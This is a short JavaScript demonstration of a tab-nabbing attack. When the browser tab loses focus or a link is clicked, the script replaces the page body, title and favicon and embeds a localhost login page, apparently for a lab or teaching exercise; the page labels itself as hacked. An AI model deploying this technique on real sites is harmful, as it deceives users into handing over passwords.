let linkActive = document.querySelector('.link-clicked');

function commonFunction() {
    document.getElementsByClassName('tabNabber')[0].innerHTML = `
      <img src='../images/hacked.jpg' class='big'>
      <h2 style='font-size:25px; text-align:center;'> Hacked Using Tab Nabbing See the Icon and Title of the Browser 
      .... by this way you can be redirected to trusted websites to get the passwords</h2>
      <iframe src="http://localhost:5000/loginPage" name='login' height="400vw;" width="1500vw";></iframe>
    `;
    document.title = 'Hacked Now!';
    let link = document.querySelector("link[rel*=icon]");
    link.rel = 'icon';
    link.href = '../images/hacker.png';
}



function attackFunction() {
    commonFunction();
}

function linkAttack() {
    commonFunction();
}

linkActive.addEventListener("click", linkAttack);
window.addEventListener('blur', attackFunction);